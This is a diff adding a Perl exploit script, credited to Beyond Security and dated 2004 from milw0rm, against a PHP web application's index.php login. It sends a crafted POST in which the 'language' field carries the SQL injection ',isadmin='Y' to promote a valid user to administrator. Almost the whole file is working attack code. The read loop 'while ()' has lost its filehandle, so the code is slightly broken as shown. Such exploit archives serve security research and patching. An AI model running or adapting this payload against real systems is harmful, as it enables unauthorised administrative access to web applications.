@@ -1,0 +1,61 @@
+#!/usr/bin/perl
+# Exploit code by Noam Rathaus of Beyond Security Ltd.
+# The following exploit code will use a valid username and password 
+combination, to cause an SQL injection.
+# Using the SQL injection, the Perl script elevates the privileges of the 
+user provided to administrative.
+
+use IO::Socket;
+use strict;
+
+my $Host = shift;
+my $Path = shift;
+my $Username = shift;
+my $Password = shift;
+
+if ($Host eq "" || $Path eq "" || $Username eq "" || $Password eq "")
+{
+print "You must run the script with the following syntax:\n";
+print $0." hostname path username password\n";
+exit(0);
+}
+
+my $remote = IO::Socket::INET->new (  Proto => "tcp", PeerAddr => $Host, 
+PeerPort => "80" );
+
+unless ($remote) { die "cannot connect to http daemon on $Host" }
+
+print "connected\n";
+
+$remote->autoflush(1);
+
+my $http = "POST /$Path/index.php HTTP/1.1
+Host: $Host
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040506 
+Firefox/0.8
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: ";
+
+my $content = 
+"PHP_AUTH_USER=$Username&password=$Password&language=english',isadmin='Y&login=Login";
+
+$http .= length($content)."
+
+$content";
+
+print "HTTP: [$http]\n";
+print $remote $http;
+sleep(1);
+print "Sent\n";
+
+while ()
+{
+print $_;
+}
+print "\n";
+
+close $remote;
+
+
+# milw0rm.com [2004-08-20]
